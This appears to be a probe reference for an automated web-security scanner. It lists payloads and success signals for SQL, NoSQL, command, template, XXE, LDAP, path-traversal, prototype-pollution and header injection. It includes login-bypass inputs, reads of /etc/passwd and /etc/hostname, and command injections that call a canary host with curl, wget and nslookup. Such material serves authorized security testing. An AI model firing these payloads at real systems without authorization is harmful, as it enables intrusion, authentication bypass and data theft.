# Injection Probes

SQL / NoSQL / command / SSTI / XXE / LDAP / path traversal. Mostly Band 1 (unless the injection takes effect — command execution is Band 2 in practice).

## Input slot enumeration

Before firing payloads, enumerate every slot:

- Path params from OpenAPI / route discovery
- Query params — fetch a 200 baseline, inspect response for reflected values
- Body fields from OpenAPI request bodies or observed 4xx validation errors
- Custom headers that the app reads (check docs / OpenAPI)
- Cookies (only if the app reads them for data, not just auth)

For each slot, baseline with a benign value, then iterate payloads from `references/probe-library.md`.

## SQL injection (Band 1)

```
PROBE: injection-sqli-union
BAND: 1
BASELINE:
  GET /api/v1/search?q=hello → record body length + content
ATTACK (iterate):
  ?q='
  ?q=' OR '1'='1
  ?q=') OR ('1'='1
  ?q=' UNION SELECT NULL,'<canary>',NULL--
SIGNAL:
  CONFIRMED if canary appears in response (UNION extracted)
  LIKELY if response differs materially from baseline on any payload
  LIKELY if body contains SQL error tokens (syntax error, unterminated quoted, ORA-, PG::, mysql)
```

```
PROBE: injection-sqli-time-based
BAND: 1
BASELINE:
  Same request, measure p50/p99 over 3 trials
ATTACK:
  ?q=' OR pg_sleep(5)--           (Postgres)
  ?q=' OR SLEEP(5)--              (MySQL)
  ?q=' OR WAITFOR DELAY '0:0:5'--  (MSSQL)
SIGNAL:
  CONFIRMED if response time ≥ baseline p99 + 4.5s (high confidence)
  NEGATIVE if within baseline
```

## NoSQL injection (Band 1)

Primarily MongoDB-style.

```
PROBE: injection-nosql-operator
BAND: 1
BASELINE:
  POST /auth/login {"email":"a@b.c","password":"wrong"} → 401
ATTACK:
  POST /auth/login {"email":"known-user@b.c","password":{"$ne":null}}
  POST /auth/login {"email":{"$regex":"^admin"},"password":{"$ne":null}}
SIGNAL:
  CONFIRMED if 2xx with auth success
```

```
PROBE: injection-nosql-where
BAND: 1
ATTACK:
  Any JSON body slot accepting an object: {"field":{"$where":"sleep(5000)"}}
SIGNAL:
  LIKELY if timing differential observed (JS $where accepted and executed)
```

## Command injection (Band 2)

Command injection requires confirming a real execution to upgrade to CONFIRMED. Band 1 is limited to timing.

```
PROBE: injection-cmd-timing
BAND: 1
BASELINE:
  record baseline latency
ATTACK:
  <input>; sleep 5
  <input> | sleep 5
  <input>`sleep 5`
  <input>$(sleep 5)
SIGNAL:
  LIKELY if any variant causes ≥ 4.5s delay (matches sleep length)
```

```
PROBE: injection-cmd-oob
BAND: 2 (requires outbound canary)
PREREQ: --canary-dns a user-controlled DNS collector OR --canary-webhook URL
ATTACK:
  <input>; curl http://{canary}/<probeid> ; 
  <input>; wget http://{canary}/<probeid> ;
  <input>; nslookup probe-{id}.{canary-dns}
SIGNAL:
  CONFIRMED if canary receives the callback within 30s
```

## SSTI (Band 1)

```
PROBE: injection-ssti-arithmetic
BAND: 1
ATTACK:
  {{7*7}}        → expect 49 in reflection
  ${7*7}         → expect 49 (EL)
  <%= 7*7 %>     → expect 49 (ERB)
  {{7*'7'}}      → expect 7777777 (Jinja2 specific)
  #{7*7}         → expect 49 (Ruby)
SIGNAL:
  CONFIRMED if arithmetic is evaluated (49 / 7777777 in the place of the literal)
  LIKELY if 500 with template-engine error ("UndefinedError", "Liquid::", "Jinja2.exceptions")
```

## XXE (Band 1–2)

For any endpoint that accepts XML:

```
PROBE: injection-xxe-entity
BAND: 1
ATTACK:
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
  <root>&xxe;</root>
SIGNAL:
  CONFIRMED if response contains hostname content
```

```
PROBE: injection-xxe-oob
BAND: 2
PREREQ: --canary-http URL
ATTACK:
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/probe-<id>">]>
  <root>&xxe;</root>
SIGNAL:
  CONFIRMED if canary receives a request
```

## LDAP injection (Band 1)

```
PROBE: injection-ldap
BAND: 1
BASELINE:
  POST /search { "uid": "jsmith" }
ATTACK:
  { "uid": "*)(uid=*" }
  { "uid": "admin)(&(1=1" }
  { "uid": "*)(uid=*))(|(uid=*" }
SIGNAL:
  CONFIRMED if wildcard-match-style response (multiple records returned)
```

## Path traversal (Band 1)

```
PROBE: injection-path-traversal
BAND: 1
ATTACK (for any `filename` / `file` / `path` / `name` param):
  ../../etc/passwd
  ..%2f..%2fetc%2fpasswd
  ....//....//etc/passwd
  /etc/passwd
  /etc/passwd%00.pdf
  ..%c0%af..%c0%afetc/passwd
SIGNAL:
  CONFIRMED if response contains "root:x:0:0:"
  LIKELY if response differs from baseline without extracting passwd
```

## Prototype pollution (Node.js — Band 1)

For any endpoint accepting JSON body:

```
PROBE: injection-proto-poll
BAND: 1
ATTACK:
  POST /... { "__proto__": { "isAdmin": true } }
  POST /... { "constructor": { "prototype": { "isAdmin": true } } }
FOLLOW-UP:
  GET /me → check if response includes isAdmin=true where it shouldn't
SIGNAL:
  CONFIRMED if a subsequent request sees the polluted property
  LEAD if the body is accepted without rejection (not enough to confirm exploit)
```

## Header injection (Band 1)

For any response header set from user input (`Content-Disposition`, `Location`):

```
PROBE: injection-header
BAND: 1
ATTACK:
  ?name=foo%0d%0aSet-Cookie:%20evil=1
  ?redirect=/home%0d%0aLocation:%20https://evil.example
SIGNAL:
  CONFIRMED if injected header appears in response (Node rejects CRLF in modern versions but old versions / proxies can be vulnerable)
```

## Output additions

```
sink: sql | nosql | cmd | ssti | xxe | ldap | path-traversal | proto-poll | header-inject
source: <input slot — path.id | query.q | body.field | header.X>
payload: <the exact payload used>
extraction: <what, if anything, was extracted (canary | error message | hostname | passwd-line)>
```
